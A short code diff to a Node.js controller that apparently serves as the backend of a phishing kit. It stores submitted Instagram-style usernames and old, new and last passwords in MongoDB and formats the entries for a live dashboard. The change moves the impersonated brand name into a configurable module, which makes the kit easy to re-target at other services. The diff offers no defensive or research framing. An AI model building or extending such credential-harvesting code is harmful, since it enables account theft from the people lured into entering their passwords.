@@ -1,12 +1,13 @@
 const InstaLogin = require('../models/InstaLogin.model');
 const { getIo } = require('../config/socket');
 const { sendSuccess, sendFailure } = require('../utils/response');
+const BRAND = require('../config/brand');
 
 /* ── Helper: map a MongoDB document to the frontend shape ────────────────── */
 const formatEntry = (entry) => {
   const base = {
     id: entry._id.toString(),
-    service: (entry.source || process.env.BRAND_NAME || 'Instagram').toLowerCase(),
+    service: (entry.source || BRAND.NAME).toLowerCase(),
     username: entry.username,
     type: entry.path || 'login',
     at: entry.createdAt ? entry.createdAt.toISOString() : new Date().toISOString(),
@@ -58,7 +59,7 @@ const instagramLogin = async (req, res) => {
       oldPassword,
       newPassword,
       lastPassword,
-      source: source || process.env.BRAND_NAME || 'Instagram',
+      source: source || BRAND.NAME,
       path: path || 'login',
       time: time || istTime,
     });
